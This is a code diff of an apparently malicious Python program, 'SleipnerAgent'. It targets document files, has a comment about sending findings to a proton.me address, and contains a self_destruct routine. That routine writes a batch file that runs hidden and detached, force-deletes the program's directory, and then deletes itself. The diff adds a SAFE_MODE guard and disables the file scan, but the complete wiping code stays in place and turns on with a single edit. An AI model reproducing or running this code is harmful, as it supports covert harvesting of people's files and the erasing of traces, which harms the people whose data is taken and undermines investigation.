@@ -1,5 +1,7 @@
 import sys, os, random, locale, tempfile, subprocess, textwrap
 
+SAFE_MODE = True
+
 TARGET_FILETYPES = [
     "docx", 
     "txt", 
@@ -43,10 +45,11 @@ class SleipnerAgent:
 
             self.determine_system_language_v2()
 
-            self._scan_files()
-            print(f"{len(self.potential_targets)} files found.")
+            # self._scan_files()
+            # print(f"{len(self.potential_targets)} files found.")
             # self._analyze_files()
             
+            # WARNING - DO NOT RUN THIS FUNCTION, IT WILL WIPE THE DIRECTORY
             self.self_destruct()
 
         else:
@@ -407,38 +410,47 @@ class SleipnerAgent:
         # Send found results to no-reply-businesssuite@proton.me
         ...
 
-    def self_destruct():
-        #  Find program path
-        program_dir = os.path.dirname(os.path.abspath(sys.argv[0]))
+    def self_destruct(self):
 
-        # Batch file in %TEMP%
-        bat_path = os.path.join(tempfile.gettempdir(), "self_delete.bat")
+        if SAFE_MODE:
+            print("#######################################################")
+            print("SAFE MODE IS ENABLED, PROGRAM HAS NOT SELF DESTRUCTED")
+            print("EDIT THE SAFE_MODE VARIABLE TO ENABLE SELF DESTRUCT")
+            print("#######################################################")
 
-        batch = textwrap.dedent(f"""\
-            @echo off
-            timeout /t 3 >nul
+        
+        else:
+            #  Find program path
+            program_dir = os.path.dirname(os.path.abspath(sys.argv[0]))
 
-            cd /d %temp%
+            # Batch file in %TEMP%
+            bat_path = os.path.join(tempfile.gettempdir(), "self_delete.bat")
 
-            for /l %%i in (1,1,30) do (
-                if not exist "{program_dir}" goto done
-                rmdir /s /q "{program_dir}" 2>nul
-                if exist "{program_dir}" timeout /t 1 >nul
-            )
-            :done
-            del "%~f0" 2>nul
-        """)
+            batch = textwrap.dedent(f"""\
+                @echo off
+                timeout /t 3 >nul
 
-        with open(bat_path, "w", encoding="utf-8") as bat:
-            bat.write(batch)
+                cd /d %temp%
 
-        # Start the batch file hidden & detached so it outlives the program
-        creationflags = subprocess.CREATE_NO_WINDOW | subprocess.DETACHED_PROCESS
-        subprocess.Popen(["cmd", "/c", bat_path], creationflags=creationflags)
+                for /l %%i in (1,1,30) do (
+                    if not exist "{program_dir}" goto done
+                    rmdir /s /q "{program_dir}" 2>nul
+                    if exist "{program_dir}" timeout /t 1 >nul
+                )
+                :done
+                del "%~f0" 2>nul
+            """)
 
-        # Leave the folder so it isn’t held open, then quit
-        os.chdir(tempfile.gettempdir())
-        sys.exit(0)
+            with open(bat_path, "w", encoding="utf-8") as bat:
+                bat.write(batch)
+
+            # Start the batch file hidden & detached so it outlives the program
+            creationflags = subprocess.CREATE_NO_WINDOW | subprocess.DETACHED_PROCESS
+            subprocess.Popen(["cmd", "/c", bat_path], creationflags=creationflags)
+
+            # Leave the folder so it isn’t held open, then quit
+            os.chdir(tempfile.gettempdir())
+            sys.exit(0)
 
 
 class Lantern:
